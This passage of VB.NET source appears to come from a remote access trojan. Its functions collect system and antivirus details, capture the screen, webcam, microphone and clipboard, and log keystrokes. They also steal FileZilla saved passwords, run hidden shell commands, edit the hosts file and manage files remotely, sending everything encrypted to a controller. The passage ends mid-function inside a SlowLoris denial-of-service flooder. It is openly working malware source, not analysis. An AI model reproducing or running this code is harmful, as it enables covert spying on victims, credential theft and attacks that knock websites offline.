                    lRet = SetWindowPos(lRet, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
                    HideTaskBar = lRet > 0
                End If
                Return True
            Catch
                Return False
            End Try
        End Function
        Public Function ShowTaskBar() As Boolean
            Try
                Dim lRet As Long
                lRet = FindWindow("Shell_traywnd", "")
                If lRet > 0 Then
                    lRet = SetWindowPos(lRet, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
                    ShowTaskBar = lRet > 0
                End If
                Return True
            Catch
                Return False
            End Try
        End Function
#End Region
#Region "Information Gathering"
#Region "Get Country"
        <DllImport("kernel32.dll")>
        Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
        End Function

        Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
        Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002

        Private Shared Function GetInfo() As String
            Dim lpLCData As Object = New System.Text.StringBuilder(256)
            Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SENGCOUNTRY, lpLCData, lpLCData.Capacity)
            If ret > 0 Then
                Dim s As String = lpLCData.ToString().Substring(0, ret - 1)
                Return UCase(s.Substring(0, 3))
            End If
            Return String.Empty
        End Function
#End Region
        Public Function getpriv() As String
            Try
                My.User.InitializeWithWindowsUser()

                If My.User.IsAuthenticated() Then
                    If My.User.IsInRole(ApplicationServices.BuiltInRole.Administrator) Then
                        Return "Admin"
                    ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.User) Then
                        Return "User"
                    ElseIf My.User.IsInRole(ApplicationServices.BuiltInRole.Guest) Then
                        Return "Guest"
                    Else
                        Return "Unknown"
                    End If
                End If
                Return "Unknown"
            Catch
                Return "Unknown"
            End Try
        End Function
        Sub sendprocess()
            Dim p As New System.Diagnostics.Process()
            Dim count As Integer = 0
            Dim Listview1 As New ListView
            For Each p In System.Diagnostics.Process.GetProcesses(My.Computer.Name)
                On Error Resume Next
                Listview1.Items.Add(p.ProcessName & ".exe")
                Listview1.Items(count).SubItems.Add(FormatNumber(Math.Round(p.PrivateMemorySize64 / 1024), 0) & " K")
                Listview1.Items(count).SubItems.Add(p.Responding)
                Listview1.Items(count).SubItems.Add(p.StartTime.ToString().Trim)
                Listview1.Items(count).SubItems.Add(p.Id)
                count += 1
            Next

            Dim Items As String = ""
            For Each item As ListViewItem In Listview1.Items
                Items = Items & item.Text & "|" & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "|" & item.SubItems(4).Text & vbNewLine
            Next
            Items = Items.Trim

            Send(AES_Encrypt("GetProcess" & Items, enckey))
        End Sub
        Sub getinstalledsoftware()
            Try

                Dim regkey, subkey As Microsoft.Win32.RegistryKey
                Dim value As String
                Dim regpath As String = "Software\Microsoft\Windows\CurrentVersion\Uninstall"
                Dim software As String = String.Empty
                Dim softwarecount As Integer

                regkey = My.Computer.Registry.LocalMachine.OpenSubKey(regpath)
                Dim subkeys() As String = regkey.GetSubKeyNames
                Dim includes As Boolean
                For Each subk As String In subkeys
                    subkey = regkey.OpenSubKey(subk)
                    value = subkey.GetValue("DisplayName", "")
                    If value <> "" Then
                        includes = True
                        If value.IndexOf("Hotfix") <> -1 Then includes = False
                        If value.IndexOf("Security Update") <> -1 Then includes = False
                        If value.IndexOf("Update for") <> -1 Then includes = False
                        If includes = True Then
                            software += value & "|" & vbCrLf
                            softwarecount += 1
                        End If
                    End If
                Next

                Dim final As String = "Software|" & softwarecount & "|" & software
                Send(AES_Encrypt(final, enckey))
            Catch
            End Try
        End Sub
#Region "System Information"
        Function getsystem() As String
            Try
                Return SystemInformation.ComputerName.ToString() & "|" &
                    SystemInformation.UserName.ToString() & "|" &
                    SystemInformation.VirtualScreen.Width & "|" &
                    SystemInformation.VirtualScreen.Height & "|" &
                    FormatNumber(My.Computer.Info.AvailablePhysicalMemory / 1024 / 1024 / 1024, 2) & " GB|" &
                    FormatNumber(My.Computer.Info.AvailableVirtualMemory / 1024 / 1024 / 1024, 2) & " GB|" &
                    My.Computer.Info.OSFullName & "|" &
                    My.Computer.Info.OSPlatform & "|" &
                    My.Computer.Info.OSVersion & "|" &
                    FormatNumber(My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024, 2) & " GB|" &
                    FormatNumber(My.Computer.Info.TotalVirtualMemory / 1024 / 1024 / 1024, 2) & " GB|" &
                    SystemInformation.PowerStatus.BatteryChargeStatus.ToString() & "|" &
                    SystemInformation.PowerStatus.BatteryFullLifetime.ToString() & "|" &
                    SystemInformation.PowerStatus.BatteryLifePercent.ToString() & "|" &
                    SystemInformation.PowerStatus.BatteryLifeRemaining.ToString() & "|" &
                    GetCPUInfo() & "|" & GetGPUName() & "|" &
                    "(Started: " & StartUp() & ") & (Uptime: " & getUptime() & ")"
            Catch
                Return "N/A"
            End Try
        End Function
        Private Function StartUp() As String
            Try
                Dim StartDate As DateTime
                Dim envTicks As Long = Environment.TickCount
                Dim msToAdd As Long = envTicks - (envTicks * 2)
                StartDate = DateTime.Now.AddMilliseconds(msToAdd)
                Return StartDate.ToString
            Catch
                Return Nothing
            End Try
        End Function
        Public Function getUptime() As String
            Try
                Dim time As String = String.Empty
                time += Math.Round(Environment.TickCount / 86400000) & " days, "
                time += Math.Round(Environment.TickCount / 3600000 Mod 24) & " hours, "
                time += Math.Round(Environment.TickCount / 120000 Mod 60) & " minutes, "
                time += Math.Round(Environment.TickCount / 1000 Mod 60) & " seconds."
                Return time
            Catch
                Return Nothing
            End Try
        End Function
        Private Function GetCPUInfo() As String
            Try
                Dim cpuName As String = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("HARDWARE\DESCRIPTION\System\CentralProcessor\0").GetValue("ProcessorNameString")
                Return cpuName.Replace("         ", " ").Replace("  ", " ")
            Catch
                Return Nothing
            End Try
        End Function
        Private Function GetGPUName() As String
            Dim GraphicsCardName As String = String.Empty
            Try
                Dim WmiSelect As New ManagementObjectSearcher _
                ("root\CIMV2", "SELECT * FROM Win32_VideoController")
                For Each WmiResults As ManagementObject In WmiSelect.Get()
                    GraphicsCardName = WmiResults.GetPropertyValue("Name").ToString
                    If (Not String.IsNullOrEmpty(GraphicsCardName)) Then
                        Exit For
                    End If
                Next
            Catch err As ManagementException
            End Try
            Return GraphicsCardName
        End Function
#End Region
#Region "Deep Information"
        Function GetDeepInfo() As String
            Try
                Dim devices As String = String.Empty

                Dim strName As String = Space(100)
                Dim strVer As String = Space(100)
                Dim bReturn As Boolean
                Dim x As Integer = 0
                Do
                    bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)
                    If bReturn Then devices += strName.Trim & "|"
                    x += 1
                Loop Until bReturn = False

                Dim res As String = String.Empty
                If devices <> "" Then
                    res = "Yes" : Else : res = "No"
                End If

                Return "|" & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner", "N/A") & "|" &
                My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOrganization", "N/A") & "|" &
                My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Win8", "ProductKey", "N/A") & "|" & NetworkInterface.GetAllNetworkInterfaces()(0).GetPhysicalAddress().ToString & "|" &
                res & "|" & GetAV() & "|" & Application.ExecutablePath
            Catch
                Return ""
            End Try
        End Function
        Function GetAV() As String
            Dim wmiQuery As Object = "Select * From AntiVirusProduct"
            Dim objWMIService As Object = GetObject("winmgmts:\\.\root\SecurityCenter2")
            Dim colItems As Object = objWMIService.ExecQuery(wmiQuery)
            For Each objItem As Object In colItems
                On Error Resume Next
                Return objItem.displayName.ToString()
            Next
            Return Nothing
        End Function
#End Region
        Function GetTCPConnections() As String
            Try
                Dim s As String = String.Empty

                Dim properties As IPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties()
                Dim connections() As TcpConnectionInformation = properties.GetActiveTcpConnections()

                For Each c As TcpConnectionInformation In connections
                    s += String.Format("{0}|{1}|{2}", c.LocalEndPoint, c.RemoteEndPoint, c.State) & vbCrLf
                Next

                Return s.Trim
            Catch
                Return Nothing
            End Try
        End Function
        Private Sub GetStartupEntries()
            Try
                Dim x As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)

                Dim dir As DirectoryInfo = New DirectoryInfo(x)
                Dim files() As FileInfo = dir.GetFiles

                Dim regkeys(3) As RegistryKey

                regkeys(0) = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
                regkeys(1) = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce")
                regkeys(2) = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
                regkeys(3) = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce")

                Dim result As String = String.Empty

                For Each File As FileInfo In files
                    result += String.Format("{0}|{1}|{2}", x, File.Name, x & "\" & File.Name) & vbCrLf
                Next

                For i As Integer = 0 To 3
                    For Each valueName As String In regkeys(i).GetValueNames()
                        result += String.Format("{0}|{1}|{2}", regkeys(i).ToString, valueName, regkeys(i).GetValue(valueName)) & vbCrLf
                    Next
                Next

                result = result.Trim
                Send(AES_Encrypt("Strtp" & result, enckey))
            Catch
            End Try
        End Sub
        Sub SendServices()
            Dim Listview1 As New ListView
            Dim scServices() As ServiceController = ServiceController.GetServices()

            For i As Integer = 0 To UBound(scServices)
                With Listview1.Items.Add(scServices(i).ServiceName)
                    .SubItems.Add(scServices(i).DisplayName)
                    .SubItems.Add(scServices(i).ServiceType.ToString)
                    .SubItems.Add(scServices(i).Status.ToString)
                End With
            Next

            Dim Items As String = ""
            For Each item As ListViewItem In Listview1.Items
                Items = Items & item.Text & "|" & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & vbNewLine
            Next
            Items = Items.Trim

            Send(AES_Encrypt("Services" & Items, enckey))
        End Sub
        Sub PerformServiceAction(ByVal number As Integer, ByVal Action As String)
            Try
                Dim scServices() As ServiceController = ServiceController.GetServices()
                Select Case Action
                    Case "Close"
                        scServices(number).Close()
                    Case "Continue"
                        scServices(number).Continue()
                    Case "Pause"
                        scServices(number).Pause()
                    Case "Start"
                        scServices(number).Start()
                    Case "Stop"
                        scServices(number).Stop()
                End Select
            Catch : End Try
        End Sub
#End Region
#Region "Encryption"
        Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
            Dim AES As New System.Security.Cryptography.RijndaelManaged
            Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim encrypted As String = ""
            Try
                Dim hash(31) As Byte
                Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
                Array.Copy(temp, 0, hash, 0, 16)
                Array.Copy(temp, 0, hash, 15, 16)
                AES.Key = hash
                AES.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
                Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
                encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
                Return encrypted
            Catch
                Return Nothing
            End Try
        End Function
        Public Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
            Dim AES As New System.Security.Cryptography.RijndaelManaged
            Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim decrypted As String = ""
            Try
                Dim hash(31) As Byte
                Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
                Array.Copy(temp, 0, hash, 0, 16)
                Array.Copy(temp, 0, hash, 15, 16)
                AES.Key = hash
                AES.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
                Dim Buffer As Byte() = Convert.FromBase64String(input)
                decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
                Return decrypted
            Catch
                Return Nothing
            End Try
        End Function
#End Region
#Region "Surveillance"
#Region "Remote Desktop"
        Sub sendscreen()
            Try

                Dim width As Integer = res.Split("x")(0)
                Dim height As Integer = res.Split("x")(1)

                Dim b As New System.Drawing.Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(b)
                g.CopyFromScreen(0, 0, 0, 0, b.Size)
                g.Dispose()

                Dim p, pp As New PictureBox
                p.Image = b
                Dim img As System.Drawing.Image = p.Image
                pp.Image = img.GetThumbnailImage(width, height, Nothing, Nothing)
                Dim img2 As System.Drawing.Image = pp.Image

                Dim bmp1 As New System.Drawing.Bitmap(img2)
                Dim jgpEncoder As System.Drawing.Imaging.ImageCodecInfo = GetEncoder(System.Drawing.Imaging.ImageFormat.Jpeg)
                Dim myEncoder As System.Drawing.Imaging.Encoder = System.Drawing.Imaging.Encoder.Quality
                Dim myEncoderParameters As New System.Drawing.Imaging.EncoderParameters(1)
                Dim myEncoderParameter As New System.Drawing.Imaging.EncoderParameter(myEncoder, comp)
                myEncoderParameters.Param(0) = myEncoderParameter
                bmp1.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\scr.jpg", jgpEncoder, myEncoderParameters)
                Send(AES_Encrypt("RemoteDesktop" & Convert.ToBase64String(IO.File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\scr.jpg")), enckey))
                IO.File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\scr.jpg")
            Catch
            End Try
        End Sub
        Private Function GetEncoder(ByVal format As System.Drawing.Imaging.ImageFormat) As System.Drawing.Imaging.ImageCodecInfo
            Try
                Dim codecs As System.Drawing.Imaging.ImageCodecInfo() = System.Drawing.Imaging.ImageCodecInfo.GetImageDecoders()
                Dim codec As System.Drawing.Imaging.ImageCodecInfo
                For Each codec In codecs
                    If codec.FormatID = format.Guid Then
                        Return codec
                    End If
                Next codec
                Return Nothing
            Catch
                Return Nothing
            End Try
        End Function
#End Region
        Sub MouseMov(ByVal txt As String)
            Try
                If txt.StartsWith("Left") Then
                    Dim x As Integer = txt.Replace("LeftSetCurPos", "").Split("x")(0)
                    Dim y As Integer = txt.Replace("LeftSetCurPos", "").Split("x")(1)

                    SetCursorPos(x, y)
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                ElseIf txt.StartsWith("Right") Then
                    Dim x As Integer = txt.Replace("RightSetCurPos", "").Split("x")(0)
                    Dim y As Integer = txt.Replace("RightSetCurPos", "").Split("x")(1)

                    SetCursorPos(x, y)
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
                End If
            Catch
            End Try
        End Sub
#Region "Audio"
        Sub audio_start()
            Try
                Dim i As Integer
                i = mciSendString("open new type waveaudio alias capture", Nothing, 0, 0)
                i = mciSendString("record capture", Nothing, 0, 0)
            Catch
            End Try
        End Sub
        Sub audio_stop()
            Try
                Dim i As Integer
                i = mciSendString("save capture " & My.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\rec.wav", Nothing, 0, 0)
                i = mciSendString("close capture", Nothing, 0, 0)
            Catch
            End Try
        End Sub
        Sub audio_get()
            Try
                Send(AES_Encrypt("RecordingFile" & SystemInformation.ComputerName & "|" & Convert.ToBase64String(File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\rec.wav")), enckey))
                File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\rec.wav")
            Catch
            End Try
        End Sub
#End Region
#Region "Webcam"
        Sub listdevices()
            Try
                Dim devices As String = String.Empty

                Dim strName As String = Space(100)
                Dim strVer As String = Space(100)
                Dim bReturn As Boolean
                Dim x As Integer = 0
                Do
                    bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)
                    If bReturn Then devices += strName.Trim & "|"
                    x += 1
                Loop Until bReturn = False
                Send(AES_Encrypt("WebcamDevices" & devices, enckey))
            Catch
            End Try
        End Sub
        Sub getwebcam()
            Try
                Dim iHeight As Integer = picCapture.Height
                Dim iWidth As Integer = picCapture.Width
                hHwnd = capCreateCaptureWindowA(iDevice, WS_VISIBLE Or WS_CHILD, 0, 0, 640, 480, picCapture.Handle.ToInt32, 0)

                If SendWebcam(hHwnd, WM_CAP_DRIVER_CONNECT, iDevice, 0) Then
                    SendWebcam(hHwnd, WM_CAP_SET_SCALE, True, 0)
                    SendWebcam(hHwnd, WM_CAP_SET_PREVIEWRATE, 66, 0)
                    SendWebcam(hHwnd, WM_CAP_SET_PREVIEW, True, 0)
                    SetWebcamPos(hHwnd, HWND_BOTTOM, 0, 0, picCapture.Width, picCapture.Height, SWP_NOMOVE Or SWP_NOZORDER)

                    Dim data As IDataObject
                    Dim bmap As System.Drawing.Image
                    SendWebcam(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
                    data = Clipboard.GetDataObject()
                    If data.GetDataPresent(GetType(System.Drawing.Bitmap)) Then
                        bmap = CType(data.GetData(GetType(System.Drawing.Bitmap)), System.Drawing.Image)
                        picCapture.Image = bmap

                        SendWebcam(hHwnd, WM_CAP_DRIVER_DISCONNECT, iDevice, 0)

                        bmap.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\wcs.png", System.Drawing.Imaging.ImageFormat.Png)
                        Send(AES_Encrypt("WebcamSnap" & Convert.ToBase64String(IO.File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\wcs.png")), enckey))
                        IO.File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\wcs.png")
                    End If
                Else
                    DestroyWebcam(hHwnd)
                End If
            Catch
            End Try
        End Sub
#End Region
        Sub SendThumbNail()
            Try

                Dim b As New System.Drawing.Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(b)
                g.CopyFromScreen(0, 0, 0, 0, b.Size)
                g.Dispose()

                Dim p, pp As New PictureBox
                p.Image = b
                Dim img As System.Drawing.Image = p.Image
                pp.Image = img.GetThumbnailImage(242, 152, Nothing, Nothing)
                Dim img2 As System.Drawing.Image = pp.Image

                Dim bmp1 As New System.Drawing.Bitmap(img2)
                Dim jgpEncoder As System.Drawing.Imaging.ImageCodecInfo = GetEncoder(System.Drawing.Imaging.ImageFormat.Jpeg)
                Dim myEncoder As System.Drawing.Imaging.Encoder = System.Drawing.Imaging.Encoder.Quality
                Dim myEncoderParameters As New System.Drawing.Imaging.EncoderParameters(1)
                Dim myEncoderParameter As New System.Drawing.Imaging.EncoderParameter(myEncoder, 100L)
                myEncoderParameters.Param(0) = myEncoderParameter
                bmp1.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\thumb.jpg", jgpEncoder, myEncoderParameters)
                Send(AES_Encrypt("ThumbNail" & Convert.ToBase64String(IO.File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\thumb.jpg")), enckey))
                IO.File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\thumb.jpg")
            Catch
            End Try
        End Sub
#End Region
#Region "Miscellaneous"
        Sub loadhostsfile()
            Try
                Send(AES_Encrypt("HostsFile" & IO.File.ReadAllText("C:\Windows\system32\drivers\etc\hosts"), enckey))
            Catch
            End Try
        End Sub
        Sub savehostsfile(ByVal txt As String)
            Try
                IO.File.WriteAllText("C:\Windows\system32\drivers\etc\hosts", txt)
            Catch
            End Try
        End Sub
        Sub getclipboardimage()
            Try
                If My.Computer.Clipboard.ContainsImage() Then
                    Dim img As New PictureBox
                    img.Image = My.Computer.Clipboard.GetImage()
                    img.Image.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\cp.jpg")
                Else
                    Dim Bmp As New System.Drawing.Bitmap(397, 187, Imaging.PixelFormat.Format32bppPArgb)
                    Bmp.SetResolution(397, 187)
                    Dim G As System.Drawing.Graphics = Graphics.FromImage(Bmp)
                    G.Clear(Color.White)
                    G.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBicubic
                    G.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
                    G.TextRenderingHint = Drawing.Text.TextRenderingHint.AntiAlias
                    Dim F As New Font("Arial", 3)
                    Dim B As New SolidBrush(Color.Red)
                    G.DrawString("The Clipboard does not have any Images!", F, B, 12, 12)

                    Bmp.Save(My.Computer.FileSystem.SpecialDirectories.Temp & "\cp.jpg")
                End If

                Send(AES_Encrypt("CPImage" & Convert.ToBase64String(IO.File.ReadAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\cp.jpg")), enckey))
                IO.File.Delete(My.Computer.FileSystem.SpecialDirectories.Temp & "\cp.jpg")
            Catch
            End Try
        End Sub
        Sub getclipboardtext()
            Try
                If My.Computer.Clipboard.ContainsText() = True Then
                    Send(AES_Encrypt("CPText" & My.Computer.Clipboard.GetText(), enckey))
                End If
            Catch
            End Try
        End Sub
        Sub setclipboardtext(ByVal text As String)
            Try
                My.Computer.Clipboard.SetText(text)
            Catch
            End Try
        End Sub
        Sub runshell(cmd As String)
            Try
                Dim p As New System.Diagnostics.Process
                Dim i As New System.Diagnostics.ProcessStartInfo("cmd")
                i.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                i.Arguments = "/C " & cmd
                i.RedirectStandardOutput = True
                i.UseShellExecute = False
                i.CreateNoWindow = True
                i.ErrorDialog = False
                p.StartInfo = i
                p.Start()
                Dim output As String = p.StandardOutput.ReadToEnd

                Send(AES_Encrypt("Shell" & output, enckey))
            Catch
            End Try
        End Sub
#End Region
#Region "Keylogger"
        Private Function GetActiveWindowTitle() As String
            Dim MyStr As String
            MyStr = New String(Chr(0), 100)
            GetWindowText(GetForegroundWindow, MyStr, 100)
            MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
            Return MyStr
        End Function
        Private Sub logger_Down(Key As String) Handles logger.Down
            Call APPU()
            logs &= Key
        End Sub
        Sub APPU()
            If strin <> GetActiveWindowTitle() Then
                logs = logs & vbCrLf & vbCrLf & "[" & My.Computer.Clock.LocalTime.Date & " " & My.Computer.Clock.LocalTime.Hour & ":" & My.Computer.Clock.LocalTime.Minute & ":" & My.Computer.Clock.LocalTime.Second & " | " & GetActiveWindowTitle() & "]" + vbNewLine & vbNewLine
                strin = GetActiveWindowTitle()
            End If
        End Sub
#End Region
        Function FileZilla() As Object
            Try
                Dim O As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")
                Dim OL As String = Nothing

                For Each u As String In O
                    Dim UU() As String = Split(u, vbNewLine)
                    For Each I As String In UU
                        If I.Contains("<Host>") Then
                            OL += Split(Split(I, "<Host>")(1), "</Host>")(0)
                        End If
                        If I.Contains("<Port>") Then
                            OL += ":" & Split(Split(I, "<Port>")(1), "</Port>")(0) & "|FileZilla"
                        End If
                        If I.Contains("<User>") Then
                            OL += "|" & Split(Split(I, "<User>")(1), "</User>")(0)
                        End If
                        If I.Contains("<Pass>") Then
                            OL += "|" & Split(Split(I, "<Pass>")(1), "</Pass>")(0) & vbCrLf
                        End If
                    Next
                Next
                Return OL
            Catch
                Return ""
            End Try
        End Function
#Region "FileManager"
        Sub listdrives()
            Try
                Dim drives As String = String.Empty
                For Each drive As IO.DriveInfo In IO.DriveInfo.GetDrives
                    Dim ltr As String = drive.Name
                    If drive.IsReady AndAlso drive.VolumeLabel <> "" Then
                    Else
                    End If
                    drives += ltr & "|"
                Next
                Send(AES_Encrypt("Drives" & drives, enckey))
            Catch
            End Try
        End Sub
        Sub showfiles(path As String)
            Try
                listviewfiles.Items.Clear()
                curntdir2 = ""
                For Each Dir As String In Directory.GetDirectories(path)
                    Dir = Dir.Replace(path, "")
                    Dim d As New DirectoryInfo(path & Dir & "\")
                    With listviewfiles.Items.Add(Dir, 0)
                        .SubItems.Add(d.CreationTime)
                        .SubItems.Add(d.LastAccessTime)
                        .SubItems.Add("")
                        .SubItems.Add("1")
                    End With
                Next

                Dim file As String
                file = Dir$(path)
                Do While Len(file)
                    Dim f As New FileInfo(path & file)
                    With listviewfiles.Items.Add(file)
                        .SubItems.Add(f.CreationTime)
                        .SubItems.Add(f.LastAccessTime)
                        .SubItems.Add(Format((f.Length / 1024) / 1024, "###,###,##0.00") & " MB")
                        .SubItems.Add("0")
                    End With
                    file = Dir$()
                Loop
                curntdir2 = path

                Dim Items As String = curntdir2 & "|"
                For Each item As ListViewItem In listviewfiles.Items
                    Items = Items & item.Text & "|" & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "|" & item.SubItems(4).Text & vbNewLine
                Next
                Items = Items.Trim

                Send(AES_Encrypt("FileManagerFiles" & Items, enckey))
            Catch
            End Try
        End Sub
        Sub createnewdirectory(ByVal path As String)
            Try
                My.Computer.FileSystem.CreateDirectory(path)
            Catch
            End Try
        End Sub
        Sub deletedirectory(ByVal path As String)
            Try
                My.Computer.FileSystem.DeleteDirectory(path, FileIO.DeleteDirectoryOption.DeleteAllContents)
            Catch
            End Try
        End Sub
        Sub renamedirectory(ByVal path As String, ByVal newname As String)
            Try
                My.Computer.FileSystem.RenameDirectory(path, newname)
            Catch
            End Try
        End Sub
        Sub movedirectory(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.MoveDirectory(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub copydirectory(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.CopyDirectory(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub CreateNewFile(ByVal txt As String)
            Try
                txt = txt.Replace("mkfile", "")
                Dim path As String = txt.Split("|")(0)
                Dim content As String = txt.Split("|")(1)
                IO.File.WriteAllText(path, content)
            Catch
            End Try
        End Sub
        Sub deletefile(ByVal path As String)
            Try
                My.Computer.FileSystem.DeleteFile(path, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
            Catch
            End Try
        End Sub
        Sub renamefile(ByVal path As String, ByVal newname As String)
            Try
                My.Computer.FileSystem.RenameFile(path, newname)
            Catch
            End Try
        End Sub
        Sub movefile(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.MoveFile(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub copyfile(ByVal oldpath As String, ByVal newpath As String, ByVal name As String)
            Try
                My.Computer.FileSystem.CopyFile(oldpath, newpath & name, True)
            Catch
            End Try
        End Sub
        Sub sharefile(ByVal filepath As String)
            Dim file As String = Convert.ToBase64String(IO.File.ReadAllBytes(filepath))
            Send(AES_Encrypt("IncomingFile" & file, enckey))
        End Sub
#End Region
    End Class
    Public Class SlowLoris
        Public Shared TList As New System.Collections.Generic.List(Of Thread)()
        Public Target As String = ""
        Public AOThreads As Integer = 50
        Public AOSockets As Integer = 70
        Dim IsFlooding As Boolean = True
        Dim WithEvents tmrGenerateRandomData As New System.Windows.Forms.Timer
        Dim labeldatasent As String
        Sub Start()
            Try
                tmrGenerateRandomData.Start()
                IsFlooding = True
                For i As Integer = 0 To AOSockets - 1
                    TList.Add((New Thread(New ThreadStart(AddressOf InitFlood))))
                    TList(TList.Count - 1).Start()
                Next
            Catch
            End Try
        End Sub
        Public Function GenerateChar(ByVal intLength As Integer, Optional ByVal strAllowedCharacters As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") As String
            Randomize()
            Dim chrChars() As Char = strAllowedCharacters.ToCharArray
            Dim strReturn As New StringBuilder
            Dim grtRandom As New Random
            Do Until Len(strReturn.ToString) = intLength
                Dim x As Integer = Rnd() * (chrChars.Length - 1)
                strReturn.Append(chrChars(CInt(x)))
            Loop
            Return strReturn.ToString
        End Function
        Private Sub InitFlood()
            Dim Shocks As Socket() = New Socket(AOThreads - 1) {}
            Dim uri As New Uri(Target)
            For i As Integer = 0 To AOThreads - 1
                If Not IsFlooding Then
                    GoTo ENDLOOP
                End If
                Shocks(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            Next
            While True
                If Not IsFlooding Then
                    GoTo ENDLOOP
                End If
                For i As Integer = 0 To AOThreads - 1
                    If Not IsFlooding Then
                        GoTo ENDLOOP
                    End If
                    If Not Shocks(i).Connected Then
RETRY_CONNECT:
                        If Not IsFlooding Then
                            GoTo ENDLOOP
                        End If
                        Try
                            Shocks(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                            Shocks(i).Connect(Dns.GetHostAddresses(uri.Host)(0), 80)
                            Shocks(i).Send(System.Text.Encoding.ASCII.GetBytes("GET " & uri.PathAndQuery &
                            " HTTP/1.1" & vbCr & vbLf & "Host: " & uri.Host & vbCr & vbLf & "User-Agent: " &
                            labeldatasent & " (config: per_thread=" & AOThreads & "; aotv2=" & AOSockets & ";)" & vbCr & vbLf), SocketFlags.None)
                        Catch generatedExceptionName As Exception
                            If Not IsFlooding Then
                                GoTo ENDLOOP
                            End If
                            Thread.Sleep(1000)
                            GoTo RETRY_CONNECT
                        End Try
                    End If
                    If Not IsFlooding Then
                        GoTo ENDLOOP
                    End If
                Next
                If Not IsFlooding Then
